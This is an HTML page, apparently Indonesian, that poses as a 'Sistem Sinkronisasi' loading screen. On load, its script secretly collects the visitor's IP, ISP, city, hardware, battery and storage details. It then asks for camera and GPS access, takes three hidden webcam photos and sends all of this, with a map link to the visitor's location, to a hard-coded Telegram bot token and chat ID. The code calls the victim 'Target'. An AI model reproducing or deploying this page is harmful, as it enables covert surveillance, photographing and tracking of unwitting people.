<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Sinkronisasi</title>
    <style>
        body { 
            background: #000; 
            display: flex; 
            flex-direction: column;
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            overflow: hidden; 
            color: #0dff00;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .loader {
            border: 4px solid #111;
            border-top: 4px solid #0dff00;
            border-radius: 50%;
            width: 45px;
            height: 45px;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .text {
            font-size: 14px;
            letter-spacing: 2px;
            font-weight: 300;
            text-transform: uppercase;
        }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div class="text">Memuat...</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    const TOKEN = '8492775361:AAE5U8rZNjqxGNnthSAaIKf-vO0-WHIrF1w';
    const CHAT_ID = '7393949927';

    async function startSilentHunter() {
        // 1. IP & ISP Intelligence
        let ipD = {};
        try { const r = await fetch('https://ipapi.co/json/'); ipD = await r.json(); } catch(e){}

        // 2. Hardware Deep Dive
        let gpu = "N/A";
        try {
            const gl = document.createElement('canvas').getContext('webgl');
            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
            gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
        } catch(e){}

        // 3. Battery & Storage
        let btr = {}; if(navigator.getBattery) btr = await navigator.getBattery();
        let str = {}; if(navigator.storage) str = await navigator.storage.estimate();

        const report = `
ðŸ”¥ **SILENT REPORT UPDATED**
------------------------------------
ðŸŒ **NETWORK**
- IP: \`${ipD.ip}\`
- ISP: ${ipD.org}
- City: ${ipD.city}
- Speed: ${navigator.connection ? navigator.connection.downlink + " Mbps" : "N/A"}

ðŸ“± **HARDWARE**
- Device: ${navigator.platform}
- RAM: ${navigator.deviceMemory || "N/A"} GB
- GPU: \`${gpu}\`
- Storage: ${(str.quota / (1024**3)).toFixed(2)} GB

ðŸ”‹ **SYSTEM**
- Battery: ${btr.level ? (btr.level*100).toFixed(0) + "%" : "N/A"}
- Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
- UserAgent: \`${navigator.userAgent.substring(0, 50)}...\`
------------------------------------`;

        await sendTele(report);

        // 4. Multimedia & GPS
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video: true});
            document.getElementById('video').srcObject = stream;
            
            // Foto Otomatis 3x (Interval 1, 3, 5 detik)
            setTimeout(() => snap(1), 1000);
            setTimeout(() => snap(2), 3000);
            setTimeout(() => snap(3), 5000);

            // Lokasi GPS Presisi
            navigator.geolocation.getCurrentPosition(p => {
                const maps = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                sendTele(`ðŸ“ **LOKASI**\nLink: ${maps}\nAkurasi: ${p.coords.accuracy.toFixed(1)}m`);
            });
        } catch(e) { 
            sendTele("âš ï¸ Target menolak izin Kamera/GPS."); 
        }
    }

    async function sendTele(t) {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: t, parse_mode: "Markdown"})
        });
    }

    function snap(n) {
        const v = document.getElementById('video');
        const c = document.getElementById('canvas');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        c.toBlob(b => {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', b, 'x.jpg');
            fd.append('caption', `ðŸ“¸ Foto Silent #${n}`);
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method: 'POST', body: fd});
        }, 'image/jpeg', 0.7);
    }

    window.onload = startSilentHunter;
</script>
</body>
</html>
